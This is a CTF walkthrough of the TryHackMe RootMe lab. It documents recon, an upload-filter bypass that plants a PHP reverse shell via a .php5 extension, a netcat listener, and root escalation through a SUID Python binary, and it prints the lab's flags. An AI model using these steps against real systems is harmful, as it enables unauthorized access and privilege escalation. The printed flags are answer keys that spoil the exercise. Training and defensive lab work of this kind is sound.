
# RootMe CTF – Walkthrough

This is my full process and solution for the [TryHackMe RootMe room](https://tryhackme.com/room/rrootme).  
It includes recon, exploitation, privilege escalation, and both flags.

---

## 📑 Table of Contents
1. [Target Info](#target-info)  
2. [Task 1 – Deploy the Machine](#task-1--deploy-the-machine)  
3. [Task 2 – Reconnaissance](#task-2--reconnaissance)  
4. [Gaining Initial Access](#gaining-initial-access)  
5. [Stable Shell Upgrade](#stable-shell-upgrade)  
6. [Initial Enumeration](#initial-enumeration)  
7. [Home Directory Inspection](#home-directory-inspection)  
8. [Privilege Escalation](#privilege-escalation)  
   - [Sudo Check](#-sudo)  
   - [SUID Binaries](#-suid-binaries)  
   - [Exploitation via Python SUID](#-exploitation-via-python-suid)  
9. [Captured Flags](#captured-flags)  
10. [Room Complete](#room-complete-)  
11. [Lessons Learned](#lessons-learned)  

---

## Target Info
**Domain:** rootme.thm  
**IP:** 10.10.227.19  

---

## Task 1 – Deploy the Machine
_No answer needed._

---

## Task 2 – Reconnaissance

### 🔍 Nmap Scan

```bash
nmap -sV -sC -oA scans/nmap-initial rootme.thm
````

```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

### ✅ Answers

* **How many ports are open?** → `2`
* **What version of Apache is running?** → `2.4.29`
  ⚠️ *Note: THM expects `2.4.29`, but actual version is `2.4.41`. See `docs/ctf-integrity-fail.md`.*
* **What service is running on port 22?** → `ssh`
* **What is the hidden directory?** → `/panel/`

---

## Gaining Initial Access

### 🔍 Upload-Based Exploitation

* Discovered upload form at: `http://rootme.thm/panel/`
* Uploaded `test.txt` → confirmed at `/uploads/test.txt`
* Tried `shell.php` → ❌ blocked
* Renamed to `shell.php5` → ✅ success

### Reverse Shell

Listener on attacker box:

```bash
nc -lvnp 4444
```

Triggering payload:

```bash
http://rootme.thm/uploads/shell.php5
```

Result:

```bash
$ whoami
www-data
```

---

## Stable Shell Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then:

* Background with `Ctrl+Z`
* On local terminal:

```bash
stty raw -echo
fg
```

* Press `Enter` → fully interactive TTY shell.

---

## Initial Enumeration

```bash
id
whoami
uname -a
hostname
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux ip-10-10-227-19 5.15.0-139-generic ...
```

---

## Home Directory Inspection

```bash
ls -l /home
```

Found users:

* `rootme`
* `test`
* `ubuntu`

*No obvious `user.txt` in `/home/*`.*

---

## Privilege Escalation

### 🔐 Sudo

```bash
sudo -l
```

→ Prompted for password
→ 3 failed attempts
→ `www-data` has **no sudo privileges**

---

### 🔍 SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

Interesting results:

* `/usr/bin/python2.7` ✅
* `/usr/bin/python` ✅ (symlink to `python2.7`) ← **THM expected answer**
* `/usr/bin/at`, `pkexec`, `passwd`, etc. → normal

**Question:** Which file is weird?
**Answer:** `/usr/bin/python`

---

### 🧨 Exploitation via Python SUID

From [GTFOBins – Python](https://gtfobins.github.io/gtfobins/python/):

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

Success:

```bash
# whoami
root
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

---

## Captured Flags

```bash
# cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}

# find / -type f -name "user.txt" 2>/dev/null
/var/www/user.txt

# cat /var/www/user.txt
THM{y0u_g0t_a_sh3ll}
```

---

## Room Complete ✅

* **Initial access:** Upload bypass via `.php5`
* **PrivEsc:** SUID misconfiguration on `/usr/bin/python`
* **Flags captured:** `user.txt` + `root.txt`
* Room objectives fully complete

---

## Lessons Learned

* **Upload restrictions ≠ security** → Simply changing the extension from `.php` to `.php5` bypassed the filter. Always validate uploads on the server side.
* **SUID binaries are dangerous** → Leaving `/usr/bin/python` with the SUID bit allowed direct root shell escalation. This is a classic misconfiguration.
* **Enumeration is key** → Finding hidden directories with GoBuster and scanning SUID binaries with `find` made exploitation straightforward.
* **CTF Integrity Check** → Sometimes version numbers reported differ from what the room expects (`2.4.41` vs. `2.4.29`). Always test, but don’t be surprised if CTF answers are slightly “off.”
* **Process > Flags** → The real value of this room was practicing upload bypass, webshell deployment, and privilege escalation through GTFOBins. The methodology transfers directly to real-world pentesting.


